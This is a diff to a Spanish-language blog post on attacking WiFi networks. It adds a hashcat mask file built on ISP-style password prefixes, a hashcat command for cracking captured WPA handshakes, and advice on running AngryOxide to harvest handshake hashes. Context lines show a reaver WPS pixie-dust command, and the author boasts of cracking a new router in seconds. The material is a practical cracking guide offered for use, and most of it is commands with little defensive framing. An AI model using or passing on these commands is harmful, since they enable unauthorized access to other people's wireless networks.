@@ -3,6 +3,29 @@ title: "Atacando redes WiFis y explotando vulnerabilidades de computadoras dentr
 date: 2024-07-21T19:48:09-03:00
 tags: ['atacando','redes','ciberseguridad','vulnerabilidades']
 ---
+Tools dedicadas a conseguir handshakes: handshaker, airgeddon, bettercap, angryoxide, etc, etc. Incluso hasta pasarlo por pyrit para verificarlo. 
+
+---
+
+
+No te hace falta usar espacio de disco almacenando diccionarios.
+Abris un simple .txt en blanco y dentro le pones
+
+```bash
+004?d?d?d?d?d?d?d
+014?d?d?d?d?d?d?d
+```
+
+Lo guardas como `004y014mas7.hcmask`. Despues solo resta correr hashcat.
+
+```bash
+hashcat -O --markov-threshold=0 -m 22000 -a 3 mi_hash.HC22000  004y014mas7.hcmask -w
+```
+
+
+
+---
+
 Si es vulnerable con pixie mas wps con correr este comando es mas que suficiente y
 es para cualquier distro.
 
@@ -21,6 +44,21 @@ sudo reaver -i wlan0 -b mac_address -c canal -S -N -L -d 10 -r 3:15 -T .5 -vv
 Hoy saque una de las nuevas de Personal en 5 segundos usando el segundo comando.
 
 Por favor, SIEMPRE prueben antes ataques via reaver antes de pasar a otros mas complejos.
+
+---
+
+https://github.com/Ragnt/AngryOxide
+
+User Guide:    
+https://github.com/Ragnt/AngryOxide/wiki/1.-User-Guide
+
+Es tremendamente explicativa la wiki, como se lanza, las opciones a ejecutar, etc.
+
+Yo lo dejo corriendo mínimo media hora, mientras va creando un archivo pcapng con el
+nombre que le hemos asignado, los .hc22000 validos conseguidos y un file .kismet.
+Para cortarlo presionamos q y los comprime en un solo .tar.gz. Si el pcapng supera
+los 100 mb, automaticamente comprime ese pero sigue creando uno nuevo.
+pero nada de otro mundo.
 
 ---
 
